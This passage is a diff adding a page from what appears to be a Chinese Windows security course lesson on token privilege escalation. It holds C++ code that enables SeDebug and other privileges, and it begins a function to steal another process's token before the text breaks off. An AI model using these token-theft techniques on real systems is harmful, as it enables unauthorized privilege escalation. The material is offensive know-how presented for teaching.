@@ -1,0 +1,1022 @@
+<h1 id="section-1">课时06 - 令牌提权</h1><h2 id="section-2">课程目标</h2><ol><li>理解Windows安全令牌机制</li><li>掌握令牌提权技术实现</li><li>实现进程权限提升功能</li><li>了解权限管理和安全策略</li></ol><h2 id="section-3">名词解释</h2><table><thead><tr><th>术语</th><th>全称</th><th>解释</th></tr></thead><tbody><tr><td>Token</td><td>安全令牌</td><td>包含进程/线程安全信息的对象</td></tr><tr><td>Privilege</td><td>特权</td><td>允许执行特定系统操作的权利</td></tr><tr><td>Impersonation</td><td>模拟</td><td>以其他用户身份执行操作</td></tr><tr><td>Elevation</td><td>提升</td><td>获取更高权限级别</td></tr></tbody></table><h2 id="section-4">技术原理</h2><h3 id="section-5">1. Windows令牌机制</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span>安全令牌结构:</span></span>
+<span class="line"><span>┌─────────────────────────────────────┐</span></span>
+<span class="line"><span>│           TOKEN结构                  │</span></span>
+<span class="line"><span>├─────────────────────────────────────┤</span></span>
+<span class="line"><span>│  用户SID列表                        │</span></span>
+<span class="line"><span>│  组SID列表                          │</span></span>
+<span class="line"><span>│  特权列表                           │</span></span>
+<span class="line"><span>│  默认DACL                          │</span></span>
+<span class="line"><span>│  令牌类型                           │</span></span>
+<span class="line"><span>│  令牌来源                           │</span></span>
+<span class="line"><span>└─────────────────────────────────────┘</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>令牌类型:</span></span>
+<span class="line"><span>Primary Token    - 主令牌，用于创建进程</span></span>
+<span class="line"><span>Impersonation Token - 模拟令牌，用于线程模拟</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>特权类型:</span></span>
+<span class="line"><span>SE_DEBUG_NAME        - 调试权限</span></span>
+<span class="line"><span>SE_TCB_NAME          - TCB权限</span></span>
+<span class="line"><span>SE_BACKUP_NAME       - 备份权限</span></span>
+<span class="line"><span>SE_RESTORE_NAME      - 恢复权限</span></span>
+<span class="line"><span>SE_TAKE_OWNERSHIP_NAME - 所有权权限</span></span>
+<span class="line"><span></span></span></code></pre><h3 id="section-6">2. 令牌提权原理</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span>提权流程:</span></span>
+<span class="line"><span>1. 获取当前进程令牌</span></span>
+<span class="line"><span>2. 查询令牌特权信息</span></span>
+<span class="line"><span>3. 启用目标特权</span></span>
+<span class="line"><span>4. 验证特权状态</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>API调用链:</span></span>
+<span class="line"><span>OpenProcessToken()  - 打开进程令牌</span></span>
+<span class="line"><span>LookupPrivilegeValue() - 查找特权值</span></span>
+<span class="line"><span>AdjustTokenPrivileges() - 调整令牌特权</span></span>
+<span class="line"><span></span></span></code></pre><h2 id="section-7">代码实现</h2><h3 id="section-8">1. 基础令牌提权实现</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// token_privilege.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 基础令牌提权实现</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 令牌提权类</span></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> TokenPrivilege</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">public:</span></span>
+<span class="line"><span style="color:#6A737D">    // 启用调试权限</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> EnableDebugPrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(SE_DEBUG_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启用备份权限</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> EnableBackupPrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(SE_BACKUP_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启用恢复权限</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> EnableRestorePrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(SE_RESTORE_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启用关机权限</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> EnableShutdownPrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(SE_SHUTDOWN_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启用系统时间权限</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> EnableSystemTimePrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(SE_SYSTEMTIME_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启用接管权限</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> EnableTakeOwnershipPrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(SE_TAKE_OWNERSHIP_NAME);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 检查特权是否启用</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> IsPrivilegeEnabled</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">GetCurrentProcess</span><span style="color:#E1E4E8">(), TOKEN_QUERY, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        LUID luid;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">LookupPrivilegeValueA</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, privilegeName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">luid)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        TOKEN_PRIVILEGES tp;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.PrivilegeCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Luid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> luid;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Attributes </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        PRIVILEGE_SET ps;</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD returnLength </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(PRIVILEGE_SET);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">PrivilegeCheck</span><span style="color:#E1E4E8">(hToken, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tp, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">ps)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (ps.PrivilegeCount </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 1</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> (ps.Control </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8"> PRIVILEGE_SET_ALL_NECESSARY));</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 列出所有可用特权</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> void</span><span style="color:#B392F0"> ListAvailablePrivileges</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">GetCurrentProcess</span><span style="color:#E1E4E8">(), TOKEN_QUERY, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD tokenInfoLength </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">        GetTokenInformation</span><span style="color:#E1E4E8">(hToken, TokenPrivileges, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tokenInfoLength);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        PTOKEN_PRIVILEGES tokenPrivileges </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PTOKEN_PRIVILEGES)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(tokenInfoLength);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">tokenPrivileges) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">GetTokenInformation</span><span style="color:#E1E4E8">(hToken, TokenPrivileges, tokenPrivileges, </span></span>
+<span class="line"><span style="color:#E1E4E8">                               tokenInfoLength, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tokenInfoLength)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Available Privileges:</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"--------------------</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            for</span><span style="color:#E1E4E8"> (DWORD i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> tokenPrivileges->PrivilegeCount; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">                char</span><span style="color:#E1E4E8"> name[</span><span style="color:#79B8FF">256</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">                DWORD nameSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(name);</span></span>
+<span class="line"><span style="color:#E1E4E8">                </span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">LookupPrivilegeNameA</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tokenPrivileges->Privileges[i].Luid, </span></span>
+<span class="line"><span style="color:#E1E4E8">                                        name, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">nameSize)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                    </span></span>
+<span class="line"><span style="color:#F97583">                    const</span><span style="color:#F97583"> char*</span><span style="color:#E1E4E8"> status </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (tokenPrivileges->Privileges[i].Attributes </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8"> SE_PRIVILEGE_ENABLED) </span></span>
+<span class="line"><span style="color:#F97583">                                        ?</span><span style="color:#9ECBFF"> "Enabled"</span><span style="color:#F97583"> :</span><span style="color:#9ECBFF"> "Disabled"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                    </span></span>
+<span class="line"><span style="color:#B392F0">                    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%-30s</span><span style="color:#9ECBFF"> [</span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF">]</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, name, status);</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(tokenPrivileges);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#6A737D">    // 启用指定特权</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">GetCurrentProcess</span><span style="color:#E1E4E8">(), TOKEN_ADJUST_PRIVILEGES </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> TOKEN_QUERY, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to open process token: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">GetLastError</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        LUID luid;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">LookupPrivilegeValueA</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, privilegeName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">luid)) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to lookup privilege value: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">GetLastError</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        TOKEN_PRIVILEGES tp;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.PrivilegeCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Luid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> luid;</span></span>
+<span class="line"><span style="color:#E1E4E8">        tp.Privileges[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Attributes </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> SE_PRIVILEGE_ENABLED;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">AdjustTokenPrivileges</span><span style="color:#E1E4E8">(hToken, FALSE, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tp, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(TOKEN_PRIVILEGES), </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to adjust token privileges: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">GetLastError</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">GetLastError</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> ERROR_NOT_ALL_ASSIGNED) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Not all privileges assigned</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Privilege enabled: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, privilegeName);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试函数</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> TestTokenPrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Token Privilege Test ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 列出当前特权</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Current privileges:</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    TokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">ListAvailablePrivileges</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 尝试启用调试权限</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">[*] Enabling debug privilege...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">TokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">EnableDebugPrivilege</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Debug privilege enabled</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to enable debug privilege</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 检查特权状态</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">TokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">IsPrivilegeEnabled</span><span style="color:#E1E4E8">(SE_DEBUG_NAME)) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Debug privilege is active</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Debug privilege is not active</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-9">2. 高级令牌提权技术</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// advanced_token_privilege.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 高级令牌提权技术</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;tlhelp32.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;vector></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 高级令牌提权类</span></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> AdvancedTokenPrivilege</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">public:</span></span>
+<span class="line"><span style="color:#6A737D">    // 从其他进程中窃取令牌</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> StealTokenFromProcess</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> processName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 创建进程快照</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hSnapshot </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateToolhelp32Snapshot</span><span style="color:#E1E4E8">(TH32CS_SNAPPROCESS, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hSnapshot </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        PROCESSENTRY32 pe32 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        pe32.dwSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(PROCESSENTRY32);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 遍历进程</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Process32First</span><span style="color:#E1E4E8">(hSnapshot, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pe32)) {</span></span>
+<span class="line"><span style="color:#F97583">            do</span><span style="color:#E1E4E8"> {</span></span>
